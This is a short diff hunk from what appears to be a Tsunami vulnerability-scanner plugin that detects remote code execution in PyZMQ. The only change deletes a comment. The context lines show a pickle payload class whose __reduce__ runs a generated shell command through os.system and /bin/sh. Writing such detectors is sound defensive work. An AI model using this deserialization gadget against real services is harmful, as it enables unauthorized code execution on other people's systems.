@@ -116,7 +116,6 @@ class PyZmqRceDetector(tsunami_plugin.VulnDetector):
 
         class Payload:
             def __reduce__(self):
-                # attempt to install curl if it is not already installed
                 return (
                     __import__('os').system,
                     (f'/bin/sh -c " {payload.get_payload()}"',))
